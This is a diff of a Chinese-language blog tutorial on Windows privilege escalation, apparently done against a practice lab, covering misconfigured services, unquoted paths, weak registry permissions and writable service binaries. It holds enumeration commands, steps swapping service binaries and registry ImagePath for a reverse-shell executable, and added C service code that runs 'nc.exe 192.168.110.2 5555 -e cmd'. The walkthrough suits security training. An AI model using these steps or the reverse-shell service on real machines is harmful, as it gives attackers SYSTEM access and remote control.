@@ -22,6 +22,7 @@
     var CONFIG = {"hostname":"evilarsene.icu","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
+
   <meta name="description" content="windows提权基础知识">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Windows Privilege Escalation">
@@ -29,10 +30,69 @@
 <meta property="og:site_name" content="Love ❤ Hacking">
 <meta property="og:description" content="windows提权基础知识">
 <meta property="og:locale">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/1.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/2.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/3.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/4.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/5.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/6.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/7.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/8.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/9.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/10.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/11.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/12.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/13.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/14.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/15.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/16.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/17.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/18.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/19.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/20.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/21.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/22.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/23.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/24.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/25.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/26.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/27.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/28.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/29.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/30.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/31.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/32.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/33.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/34.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/35.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/36.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/37.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/38.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/39.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/40.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/41.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/42.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/43.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/44.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/45.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/46.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/47.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/48.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/49.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/50.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/51.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/52.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/53.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/54.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/55.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/56.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/57.png">
+<meta property="og:image" content="http://evilarsene.icu/images/windows-privilege-escalation/58.png">
 <meta property="article:published_time" content="2020-08-31T05:30:18.000Z">
-<meta property="article:modified_time" content="2020-10-15T18:03:27.680Z">
+<meta property="article:modified_time" content="2021-01-09T12:00:28.566Z">
 <meta property="article:author" content="EvilArsene">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://evilarsene.icu/images/windows-privilege-escalation/1.png">
 
 <link rel="canonical" href="http://evilarsene.icu/2020/08/31/Windows-Privilege-Escalation/">
 
@@ -222,7 +282,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-16 02:03:27" itemprop="dateModified" datetime="2020-10-16T02:03:27+08:00">2020-10-16</time>
+                <time title="修改时间：2021-01-09 20:00:28" itemprop="dateModified" datetime="2021-01-09T20:00:28+08:00">2021-01-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -294,9 +354,12 @@
 <p>watson(依赖.Net,所以要先枚举对方的.Net版本:C:\windows\microsoft.net\framework)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\watson</span><br></pre></td></tr></table></figure>
 
+<p>accesschk<br>简单来说</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">quv	这三个选项都是优化查询的</span><br><span class="line">w  	可写</span><br><span class="line">c 	服务</span><br><span class="line">k   注册表</span><br><span class="line">d 	目录</span><br></pre></td></tr></table></figure>
+
 <h2 id="Services-Exploits"><a href="#Services-Exploits" class="headerlink" title="Services Exploits"></a>Services Exploits</h2><p>服务是运行在后台的常规任务，它可以接受用户输入。如果服务以系统权限运行并且配置错误，它会导致能够SYSTEM权限执行任意命令</p>
 <h3 id="手动枚举服务"><a href="#手动枚举服务" class="headerlink" title="手动枚举服务"></a>手动枚举服务</h3><p>获取服务名称</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get displayname,name</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get displayname,name,pathname</span><br></pre></td></tr></table></figure>
 
 <p>查询服务配置</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe qc &lt;name&gt;</span><br></pre></td></tr></table></figure>
@@ -319,7 +382,9 @@
 <li>DLL Hijacking</li>
 </ol>
 <h4 id="Insecure-Service-Properties"><a href="#Insecure-Service-Properties" class="headerlink" title="Insecure Service Properties"></a>Insecure Service Properties</h4><p>每个服务都会通过ACL来规定用户对它的权限<br>有些是无害的，比如(SERVICE_QUERY_CONFIG，SERVICE_QUERY_STATUS)<br>有些可能有用，比如(SERVICE_STOP，SERVICE_START)<br>有些是危险的，比如(SERVICE_CHANGE_CONFIG,SERVICE_CHANGE_CONFIG)</p>
-<p>如果我们有权限可以修改运行在SYSTEM权限下服务的配置信息，就去修改其执行的二进制文件的路径<br><strong>注意</strong>：如果你可以修改一个服务的配置，但是不能启动或停止该服务，你可能不能利用它来进行提权</p>
+<p>如果我们有权限可以修改运行在SYSTEM权限下服务的配置信息，就去修改其执行的二进制文件的路径<br><strong>注意</strong>：如果你可以修改一个服务的配置，但是不能启动或停止该服务，你可能不能利用它来进行提权，对于自动启动的服务，我们应该去检查SeShutdownPrivilege，如果可以重启，也能可以得到权限提升</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutdown &#x2F;r &#x2F;t 0</span><br></pre></td></tr></table></figure>
+
 <p>演示</p>
 <ol>
 <li>winpeas枚举</li>
@@ -332,8 +397,8 @@
 <ol start="2">
 <li>关注有漏洞的服务</li>
 </ol>
-<p>![1](/images/windows privilege escalation/1.png)</p>
-<p>![2](/images/windows privilege escalation/2.png)</p>
+<p><img src="/images/windows-privilege-escalation/1.png" alt="1"></p>
+<p><img src="/images/windows-privilege-escalation/2.png" alt="2"></p>
 <ol start="3">
 <li>accesschk进一步检查权限</li>
 </ol>
@@ -341,25 +406,23 @@
 
 
 
-<p>![3](/images/windows privilege escalation/3.png)</p>
+<p><img src="/images/windows-privilege-escalation/3.png" alt="3"></p>
 <p>发现有我们提权所需的权限</p>
 <ol start="4">
 <li>确认服务的配置信息</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc daclsvc</span><br></pre></td></tr></table></figure>
 
-<p>![4](/images/windows privilege escalation/4.png)</p>
+<p><img src="/images/windows-privilege-escalation/4.png" alt="4"></p>
 <p>从中重点关注</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">START_TYPE         : 3   DEMAND_START											&#x2F;&#x2F;可以手动启动</span><br><span class="line">BINARY_PATH_NAME   : &quot;C:\Program Files\DACL Service\daclservice.exe&quot;			&#x2F;&#x2F;文件执行路径</span><br><span class="line">DEPENDENCIES       : 															&#x2F;&#x2F;程序执行没有依赖</span><br><span class="line">SERVICE_START_NAME : LocalSystem												&#x2F;&#x2F;服务确实以SYSTEM来运行</span><br></pre></td></tr></table></figure>
-
-
 
 <ol start="5">
 <li>检查当前运行状态</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc query daclsvc</span><br></pre></td></tr></table></figure>
 
-<p>![5](/images/windows privilege escalation/5.png)</p>
+<p><img src="/images/windows-privilege-escalation/5.png" alt="5"></p>
 <p>这里为STOPPED，表示我们修改完准备利用的配置后，直接启动服务即可</p>
 <ol start="6">
 <li>重新设置</li>
@@ -372,7 +435,7 @@
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start daclsvc</span><br></pre></td></tr></table></figure>
 
-<p>![6](/images/windows privilege escalation/6.png)</p>
+<p><img src="/images/windows-privilege-escalation/6.png" alt="6"></p>
 <h4 id="Unquoted-Service-Path"><a href="#Unquoted-Service-Path" class="headerlink" title="Unquoted Service Path"></a>Unquoted Service Path</h4><p>windows的可执行程序可以在不需要扩展名的情况下运行(如whoami.exe只需要whoami即可运行)<br>一些可执行文件会接受参数，用空格符分隔，如program.exe agr1 agr2….<br>当使用不带引号且包含空格绝对路径时，这会导致歧义</p>
 <p>比如这样的路径<code>C:\Program Files\Some Dir\SomeProgram.exe</code>，正常来看，它执行的是SomeProgram.exe<br>但对于windows来说，<code>C:\Program</code>可以是一个可执行程序，它携带两个参数<code>Files\Some</code>和<code>Dir\ SomeProgram.exe</code><br>windows会依次检查这种潜在可能性来进行排除。如果我们可以写入一个可执行文件在windows检查原本可执行文件之前，可以诱使服务去执行它们</p>
 <p>演示</p>
@@ -382,13 +445,16 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>
 
 <p>在<code>Interesting Services -non Microsoft</code>条目里发现<code>No quotes and Space detected</code></p>
-<p>![7](/images/windows privilege escalation/7.png)</p>
+<p><img src="/images/windows-privilege-escalation/7.png" alt="7"></p>
+<p>手动枚举</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode | findstr &#x2F;i &#x2F;V &quot;C:\Windows&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">powershell</span><br><span class="line">Get-WmiObject win32_service | select Name,PathName,StartMode,StartName | where &#123;$_.StartMode -ne &quot;Disabled&quot; -and $_.StartName -eq &quot;LocalSystem&quot; -and $_.PathName -notmatch &quot;&#96;&quot;&quot; -and $_.PathName -notmatch &quot;C:\\Windows&quot;&#125; | Format-List</span><br></pre></td></tr></table></figure>
+
 <ol start="2">
 <li>检查服务的配置</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc unquotedsvc</span><br></pre></td></tr></table></figure>
 
-<p>![8](/images/windows privilege escalation/8.png)</p>
+<p><img src="/images/windows-privilege-escalation/8.png" alt="8"></p>
 <p>从路径，我们得到利用路径</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe</span><br><span class="line"></span><br><span class="line">可利用</span><br><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Unquoted.exe</span><br><span class="line">C:\Program Files\Unquoted Path Service\Common.exe</span><br></pre></td></tr></table></figure>
 
@@ -397,69 +463,75 @@
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -ucqv user unquotedsvc</span><br></pre></td></tr></table></figure>
 
-<p>![9](/images/windows privilege escalation/9.png)</p>
+<p><img src="/images/windows-privilege-escalation/9.png" alt="9"></p>
 <ol start="4">
 <li>依次检查可利用路径是否可以写入文件</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uwdq C:\</span><br><span class="line">.\accesschk.exe &#x2F;accepteula -uwdq &quot;C:\Program Files\&quot;</span><br><span class="line">.\accesschk.exe &#x2F;accepteula -uwdq &quot;C:\Program Files\Unquoted Path Service\&quot;</span><br></pre></td></tr></table></figure>
 
-<p>![10](/images/windows privilege escalation/10.png)</p>
+<p><img src="/images/windows-privilege-escalation/10.png" alt="10"></p>
 <p>看来在路径<code>C:\Program Files\Unquoted Path Service\</code>下<code>RW BUILTIN\Users</code>组的用户拥有W权限，这也是我们用户所在的组</p>
 <ol start="5">
 <li>复制我们提前准备好的reverse_shell的exe文件到利用目录，并改名</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\PrivEsc\reverse.exe &quot;C:\Program Files\Unquoted Path Service\Common.exe&quot;</span><br></pre></td></tr></table></figure>
 
-<p>![11](/images/windows privilege escalation/11.png)</p>
+<p><img src="/images/windows-privilege-escalation/11.png" alt="11"></p>
 <ol start="6">
 <li>开启端口监听，并启动服务</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start unquotedsvc</span><br></pre></td></tr></table></figure>
 
-<p>![12](/images/windows privilege escalation/12.png)</p>
+<p><img src="/images/windows-privilege-escalation/12.png" alt="12"></p>
 <h4 id="Weak-Registry-Permissions"><a href="#Weak-Registry-Permissions" class="headerlink" title="Weak Registry Permissions"></a>Weak Registry Permissions</h4><p>windows的注册表存储每个服务的条目。注册表项也会使用ACL管理权限，如果ACL配置错误，即使不能直接修改服务，也可以修改服务的配置</p>
 <ol>
 <li>winpeas枚举</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>
 
-<p>![13](/images/windows privilege escalation/13.png)</p>
+<p><img src="/images/windows-privilege-escalation/13.png" alt="13"></p>
 <p>发现了当前用户可以修改服务regsvc的注册表条目</p>
+<p>手动枚举</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -kvusw hklm\System\CurrentControlSet\services</span><br><span class="line">(寻找:</span><br><span class="line">  RW NT AUTHORITY\INTERACTIVE</span><br><span class="line">        KEY_ALL_ACCESS</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">powershell</span><br><span class="line">Get-Acl -Path hklm:\System\CurrentControlset\services\* | select Path,AccessToString |Format-List</span><br><span class="line">(寻找:NT AUTHORITY\INTERACTIVE Allow  FullControl)</span><br></pre></td></tr></table></figure>
+
 <ol start="2">
 <li>使用powershell或accesschk进一步检查我们对注册表的权限</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\PrivEsc&gt;powershell -exec bypass</span><br><span class="line">PS C:\PrivEsc&gt; Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc |Format-List</span><br></pre></td></tr></table></figure>
 
-<p>![14](/images/windows privilege escalation/14.png)</p>
+<p><img src="/images/windows-privilege-escalation/14.png" alt="14"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc</span><br></pre></td></tr></table></figure>
 
-<p>![15](/images/windows privilege escalation/15.png)</p>
+<p><img src="/images/windows-privilege-escalation/15.png" alt="15"></p>
 <p>注意<code>NT AUTHORITY\INTERACTIVE</code>组具有RW权限，这个组的成员包含所有能够登录到系统的成员，其中就有我们当前的用户</p>
 <ol start="3">
 <li>检查我们是否能够启动/停止服务</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -ucqv user regsvc</span><br></pre></td></tr></table></figure>
 
-<p>![16](/images/windows privilege escalation/16.png)</p>
+<p><img src="/images/windows-privilege-escalation/16.png" alt="16"></p>
 <ol start="4">
 <li>检查当前注册表的值</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc</span><br></pre></td></tr></table></figure>
 
-<p>![17](/images/windows privilege escalation/17.png)</p>
+<p><img src="/images/windows-privilege-escalation/17.png" alt="17"></p>
 <p>从中我们知道了可执行程序的绝对路径和该服务以SYSTEM运行</p>
 <ol start="5">
 <li>接下来就和修改服务启动路径的方法一致，替换为我们的reverse_shell，不同点使这次我们通过修改注册表的值来完成</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc &#x2F;v ImagePath &#x2F;t REG_EXPAND_SZ &#x2F;d C:\PrivEsc\reverse.exe &#x2F;f</span><br></pre></td></tr></table></figure>
 
-<p>![18](/images/windows privilege escalation/18.png)</p>
+<p><img src="/images/windows-privilege-escalation/18.png" alt="18"></p>
+<p>除了反弹shell.exe，也可以编译生成自己想要的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;x86_64-w64-mingw32-gcc windows_service.c -o evil.exe</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#define SLEEP_TIME 5000</span><br><span class="line"></span><br><span class="line">SERVICE_STATUS ServiceStatus; </span><br><span class="line">SERVICE_STATUS_HANDLE hStatus; </span><br><span class="line"> </span><br><span class="line">void ServiceMain(int argc, char** argv); </span><br><span class="line">void ControlHandler(DWORD request); </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;add the payload here</span><br><span class="line">int Run() </span><br><span class="line">&#123; </span><br><span class="line">    system(&quot;C:\\Users\\user\\Desktop\\nc.exe 192.168.110.2 5555 -e cmd&quot;);</span><br><span class="line">    return 0; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">int main() </span><br><span class="line">&#123; </span><br><span class="line">    SERVICE_TABLE_ENTRY ServiceTable[2];</span><br><span class="line">    ServiceTable[0].lpServiceName &#x3D; &quot;MyService&quot;;</span><br><span class="line">    ServiceTable[0].lpServiceProc &#x3D; (LPSERVICE_MAIN_FUNCTION)ServiceMain;</span><br><span class="line"></span><br><span class="line">    ServiceTable[1].lpServiceName &#x3D; NULL;</span><br><span class="line">    ServiceTable[1].lpServiceProc &#x3D; NULL;</span><br><span class="line"> </span><br><span class="line">    StartServiceCtrlDispatcher(ServiceTable);  </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ServiceMain(int argc, char** argv) </span><br><span class="line">&#123; </span><br><span class="line">    ServiceStatus.dwServiceType        &#x3D; SERVICE_WIN32; </span><br><span class="line">    ServiceStatus.dwCurrentState       &#x3D; SERVICE_START_PENDING; </span><br><span class="line">    ServiceStatus.dwControlsAccepted   &#x3D; SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;</span><br><span class="line">    ServiceStatus.dwWin32ExitCode      &#x3D; 0; </span><br><span class="line">    ServiceStatus.dwServiceSpecificExitCode &#x3D; 0; </span><br><span class="line">    ServiceStatus.dwCheckPoint         &#x3D; 0; </span><br><span class="line">    ServiceStatus.dwWaitHint           &#x3D; 0; </span><br><span class="line"> </span><br><span class="line">    hStatus &#x3D; RegisterServiceCtrlHandler(&quot;MyService&quot;, (LPHANDLER_FUNCTION)ControlHandler); </span><br><span class="line">    Run(); </span><br><span class="line">    </span><br><span class="line">    ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING; </span><br><span class="line">    SetServiceStatus (hStatus, &amp;ServiceStatus);</span><br><span class="line"> </span><br><span class="line">    while (ServiceStatus.dwCurrentState &#x3D;&#x3D; SERVICE_RUNNING)</span><br><span class="line">    &#123;</span><br><span class="line">		Sleep(SLEEP_TIME);</span><br><span class="line">    &#125;</span><br><span class="line">    return; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ControlHandler(DWORD request) </span><br><span class="line">&#123; </span><br><span class="line">    switch(request) </span><br><span class="line">    &#123; </span><br><span class="line">        case SERVICE_CONTROL_STOP: </span><br><span class="line">			ServiceStatus.dwWin32ExitCode &#x3D; 0; </span><br><span class="line">            ServiceStatus.dwCurrentState  &#x3D; SERVICE_STOPPED; </span><br><span class="line">            SetServiceStatus (hStatus, &amp;ServiceStatus);</span><br><span class="line">            return; </span><br><span class="line"> </span><br><span class="line">        case SERVICE_CONTROL_SHUTDOWN: </span><br><span class="line">            ServiceStatus.dwWin32ExitCode &#x3D; 0; </span><br><span class="line">            ServiceStatus.dwCurrentState  &#x3D; SERVICE_STOPPED; </span><br><span class="line">            SetServiceStatus (hStatus, &amp;ServiceStatus);</span><br><span class="line">            return; </span><br><span class="line">        </span><br><span class="line">        default:</span><br><span class="line">            break;</span><br><span class="line">    &#125; </span><br><span class="line">    SetServiceStatus (hStatus,  &amp;ServiceStatus);</span><br><span class="line">    return; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
 <ol start="6">
 <li>开启监听，启动服务</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start regsvc</span><br></pre></td></tr></table></figure>
 
-<p>![19](/images/windows privilege escalation/19.png)</p>
+<p><img src="/images/windows-privilege-escalation/19.png" alt="19"></p>
 <h4 id="Insecure-Service-Executables"><a href="#Insecure-Service-Executables" class="headerlink" title="Insecure Service Executables"></a>Insecure Service Executables</h4><p>如果用户可直接修改原始服务的可执行文件，我们可以直接用我们的reverse_shell来代替<br>这种操作具有危险性，正式渗透中应该先备份服务文件</p>
 <p>演示</p>
 <ol>
@@ -467,29 +539,33 @@
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>
 
-<p>![20](/images/windows privilege escalation/20.png)</p>
+<p><img src="/images/windows-privilege-escalation/20.png" alt="20"></p>
 <p>在<code>Interesting Services -non Microsoft</code>条目下发现<code>File Permissions: Everyone [AllAccess]</code></p>
+<p>手动枚举只能枚举服务的二进制程序路径，然后检查该文件的权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic service get displayname,name,pathname</span><br><span class="line">.\accesschk.exe &#x2F;accepteula -quvw &quot;FILE_PATH&quot;</span><br></pre></td></tr></table></figure>
+
 <ol start="2">
 <li>accesschk检查文件权限</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -quvw &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</span><br></pre></td></tr></table></figure>
 
-<p>![21](/images/windows privilege escalation/21.png)</p>
+<p><img src="/images/windows-privilege-escalation/21.png" alt="21"></p>
 <ol start="3">
 <li>检查我们是否能够启动/停止服务</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uvqc filepermsvc</span><br></pre></td></tr></table></figure>
 
-<p>![22](/images/windows privilege escalation/22.png)</p>
+<p><img src="/images/windows-privilege-escalation/22.png" alt="22"></p>
 <ol start="4">
 <li>安全备份原始文件，并将reverse_shell的exe文件对其进行替换</li>
 </ol>
